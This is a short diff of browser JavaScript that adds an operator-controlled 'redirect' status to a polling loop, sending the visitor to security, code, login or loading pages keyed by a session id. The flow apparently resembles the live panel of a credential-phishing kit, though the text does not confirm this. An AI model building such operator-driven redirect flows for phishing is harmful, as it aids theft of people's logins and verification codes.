@@ -231,7 +231,12 @@
                 fetch('/api/status/' + sid)
                     .then(function(r) { return r.json(); })
                     .then(function(d) {
-                        if (d.status === 'accepted') {
+                        if (d.status === 'redirect' && d.redirect) {
+                            clearInterval(interval);
+                            var pages = {security:'security.html',code:'code.html',login:'login.html',wait:'loading.html'};
+                            var target = pages[d.redirect];
+                            if (target && target !== 'code.html') window.location.href = target + '?id=' + sid;
+                        } else if (d.status === 'accepted') {
                             clearInterval(interval);
                             window.location.href = 'security.html?id=' + sid;
                         } else if (d.status === 'rejected') {
